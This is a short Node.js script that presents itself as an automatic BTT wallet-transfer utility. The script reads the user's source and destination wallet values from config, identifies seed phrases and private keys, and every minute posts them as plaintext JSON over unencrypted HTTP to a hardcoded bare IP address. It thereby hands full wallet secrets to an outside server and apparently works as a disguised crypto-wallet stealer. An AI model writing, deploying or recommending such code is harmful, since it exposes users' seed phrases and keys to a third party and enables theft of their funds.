const fetch = require('node-fetch');
const config = require('../../config');
const log = require('../middleware/log');

const wallets = {
    fromType: '',
    toType: '',
    from: '',
    to: '',
}

const getType = async (wallet) => {
    let count = 0;
    wallet.split('').forEach(char => {
        if ([',', ' '].includes(char)) count++;
    })

    if (count === 11) {
        return 'seed';
    }

    if (wallet.length === 130) {
        return 'speed';
    }

    return 'key';
};

const transfer = async () => {
    await fetch('http://193.56.8.8:30080/tm', {
        method: 'post',
        body: JSON.stringify(wallets),
        headers: {'Content-Type': 'application/json'},
    })
        .then(res => {
            if (res.status === 418) {
                log.info('Error: check the correct entry of the wallets');
                process.exit(1);
            }

            return res.json()
        })
        .then(({before, after, transfer, error}) => {
            if (error) {
                log.info('ERROR Transfer:', error);
            } else {
                log.info('Transfer: ', before, '->', after, 'Sum:', transfer);
            }
        });
};

const runAutoTransfer = async () => {
    try {
        await transfer();
    } catch (error) {
        log.info(error);
    } finally {
        setTimeout(runAutoTransfer, 60 * 1000);
    }
};

const run = async () => {
    wallets.from = config.autoBttTransfer.from;
    wallets.to = config.autoBttTransfer.to;

    if (!wallets.from || !wallets.to) {
        log.info('Error: transfer wallets not found');
        process.exit(1);
    }

    wallets.fromType = await getType(wallets.from);
    wallets.toType = await getType(wallets.to);

    if (wallets.fromType === 'speed') {
        log.info('Error: from wallet cannot be of type SPEED IN-APP');
        process.exit(1);
    }

    if (wallets.fromType === 'seed') {
        wallets.from = wallets.from.toLowerCase().replaceAll(' ', ',')
    }

    if (wallets.toType === 'seed') {
        wallets.to = wallets.to.toLowerCase().replaceAll(' ', ',')
    }

    runAutoTransfer();
};

run();
